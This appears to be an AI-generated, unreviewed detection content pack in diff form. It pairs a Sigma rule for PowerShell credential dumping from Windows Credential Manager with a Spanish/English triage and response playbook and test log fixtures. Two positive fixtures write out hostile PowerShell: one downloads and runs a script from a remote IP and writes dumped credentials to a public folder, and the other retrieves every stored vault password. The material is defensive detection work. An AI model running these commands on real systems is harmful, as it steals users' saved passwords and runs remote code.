@@ -1,0 +1,138 @@
+{
+  "rule": {
+    "id": "99c49d9c-34ea-45f7-84a7-4751ae6b2cbc",
+    "title": "Dump Credentials from Windows Credential Manager With PowerShell",
+    "level": "medium",
+    "status": "test",
+    "author": "frack113",
+    "path": "windows/powershell/powershell_script/posh_ps_dump_password_windows_credential_manager.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/powershell/powershell_script/posh_ps_dump_password_windows_credential_manager.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1555"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un script block de PowerShell contiene código que lee credenciales del Administrador de credenciales de Windows, ya sea con funciones conocidas de volcado o con el objeto WinRT PasswordVault. Puede indicar robo de contraseñas guardadas del usuario.",
+      "what_it_detects": "Eventos 4104 (Script Block Logging) cuyo ScriptBlockText contiene Get-PasswordVaultCredentials o Get-CredManCreds; New-Object con Windows.Security.Credentials.PasswordVault; o código C# compilado en tiempo de ejecución con CSharpCodeProvider, CompilerParameters, GetRuntimeDirectory() y ArrayList, típico de volcadores del Credential Manager.",
+      "why_it_matters": "Corresponde a ATT&CK T1555 (Credentials from Password Stores). El Credential Manager guarda contraseñas web y de red que el usuario puede recuperar en texto claro. Un atacante con sesión del usuario las obtiene sin privilegios elevados y luego las usa para moverse lateralmente o acceder a servicios.",
+      "triage_steps": [
+        "Lea el ScriptBlockText completo; si el script viene en varias partes, reconstrúyalo con ScriptBlockId y los números de mensaje.",
+        "Identifique cuál selección coincidió: función conocida, PasswordVault con RetrieveAll/RetrievePassword o compilación C# en línea que llama a CredEnumerate.",
+        "Revise el campo Path y el usuario del evento; un script sin ruta indica ejecución interactiva, codificada o descargada.",
+        "Pivotee al proceso de PowerShell y su ParentImage (4688 o Sysmon 1) en el mismo host, +/- 15 minutos.",
+        "Busque en el mismo host y periodo descargas (DownloadString, IEX), archivos de salida y conexiones salientes hacia destinos poco comunes.",
+        "Revise inicios de sesión 4624/4648 posteriores con cuentas del usuario, y alertas previas para el host o el usuario."
+      ],
+      "false_positives": [
+        "Pruebas de Atomic Red Team o ejercicios de red team autorizados que ejecutan las funciones de T1555.",
+        "Scripts de administradores que inventarían o migran credenciales guardadas durante un cambio de equipo.",
+        "Desarrolladores que prueban las API WinRT de PasswordVault desde PowerShell."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o con el equipo de seguridad si la ejecución estaba autorizada.",
+        "Si no lo estaba, aísle el endpoint y conserve el script, los registros de PowerShell y la memoria del proceso.",
+        "Cambie las contraseñas guardadas en el Credential Manager del usuario afectado y cierre sus sesiones activas.",
+        "Elimine el script, las herramientas descargadas y cualquier persistencia relacionada.",
+        "Busque el mismo ScriptBlockText en toda la flota y vigile el uso de las credenciales expuestas."
+      ],
+      "severity_rationale": "Medium es adecuado: el patrón es muy específico de volcado de credenciales, pero solo afecta el contexto del usuario y las pruebas autorizadas producen coincidencias legítimas."
+    },
+    "en": {
+      "summary": "A PowerShell script block contains code that reads credentials from Windows Credential Manager, either through known dumping functions or the WinRT PasswordVault object. This may indicate theft of the user's saved passwords.",
+      "what_it_detects": "Event 4104 (Script Block Logging) where ScriptBlockText contains Get-PasswordVaultCredentials or Get-CredManCreds; New-Object with Windows.Security.Credentials.PasswordVault; or inline C# compiled at runtime with CSharpCodeProvider, CompilerParameters, GetRuntimeDirectory() and ArrayList, a pattern used by Credential Manager dumpers.",
+      "why_it_matters": "This maps to ATT&CK T1555 (Credentials from Password Stores). Credential Manager stores web and network passwords the user can recover in cleartext. An attacker running as the user gets them without elevation and reuses them for lateral movement or service access.",
+      "triage_steps": [
+        "Read the full ScriptBlockText; if the script was split into several events, rebuild it using ScriptBlockId and the message numbers.",
+        "Determine which selection matched: a known function, PasswordVault with RetrieveAll/RetrievePassword, or inline C# calling CredEnumerate.",
+        "Check the Path field and the user; an empty path suggests interactive, encoded or downloaded execution.",
+        "Pivot to the PowerShell process and its ParentImage (4688 or Sysmon 1) on the same host, +/- 15 minutes.",
+        "Look on the same host and timeframe for downloads (DownloadString, IEX), output files and outbound connections to unusual destinations.",
+        "Review later 4624/4648 logons using the user's accounts, and earlier alerts for the host or user."
+      ],
+      "false_positives": [
+        "Atomic Red Team tests or authorized red team exercises running the T1555 functions.",
+        "Administrator scripts that inventory or migrate saved credentials during a device refresh.",
+        "Developers testing the WinRT PasswordVault APIs from PowerShell."
+      ],
+      "response_steps": [
+        "Confirm with the user or the security team whether the execution was authorized.",
+        "If not, isolate the endpoint and preserve the script, PowerShell logs and process memory.",
+        "Reset passwords stored in the affected user's Credential Manager and revoke active sessions.",
+        "Remove the script, downloaded tools and any related persistence.",
+        "Hunt for the same ScriptBlockText across the fleet and monitor use of the exposed credentials."
+      ],
+      "severity_rationale": "Medium fits: the pattern is highly specific to credential dumping, but it is limited to the user's context and authorized testing produces legitimate matches."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Known dumping function Get-PasswordVaultCredentials invoked in a script block (selection_kiddie).",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0142.andes.example.com",
+          "UserID": "ANDES\\jperez",
+          "ScriptBlockId": "3f2a9c1e-7b4d-4e8a-9c21-5d6e7f8a9b01",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "",
+          "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.15/creds.ps1'); Get-PasswordVaultCredentials | Out-File C:\\Users\\Public\\v.txt"
+        }
+      },
+      {
+        "description": "PasswordVault WinRT object created and all entries retrieved (selection_rename_Password).",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-0142.andes.example.com",
+          "UserID": "ANDES\\jperez",
+          "ScriptBlockId": "8d1c4b2a-0e3f-4a5b-b6c7-d8e9f0a1b2c3",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "C:\\Users\\jperez\\AppData\\Local\\Temp\\v.ps1",
+          "ScriptBlockText": "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $vault = New-Object Windows.Security.Credentials.PasswordVault; $vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Admin script using the CredentialManager module to read one named credential; no rule strings present.",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "SRV-APP-03.andes.example.com",
+          "UserID": "ANDES\\svc_backup",
+          "ScriptBlockId": "1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "C:\\Scripts\\backup-share.ps1",
+          "ScriptBlockText": "Import-Module CredentialManager; $c = Get-StoredCredential -Target 'backup.example.com'; New-PSDrive -Name B -PSProvider FileSystem -Root \\\\backup.example.com\\data -Credential $c"
+        }
+      },
+      {
+        "description": "Build script compiling C# with CSharpCodeProvider and CompilerParameters but without GetRuntimeDirectory and ArrayList, so selection_rename_credman is incomplete.",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "WS-DEV-07.andes.example.com",
+          "UserID": "ANDES\\mrodriguez",
+          "ScriptBlockId": "9e8d7c6b-5a4f-4e3d-2c1b-0a9f8e7d6c5b",
+          "MessageNumber": 1,
+          "MessageTotal": 1,
+          "Path": "C:\\Repos\\tools\\build.ps1",
+          "ScriptBlockText": "$provider = New-Object Microsoft.CSharp.CSharpCodeProvider; $params = New-Object System.CodeDom.Compiler.CompilerParameters; $params.GenerateInMemory = $true; $result = $provider.CompileAssemblyFromSource($params, $source)"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-25T21:59:49+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
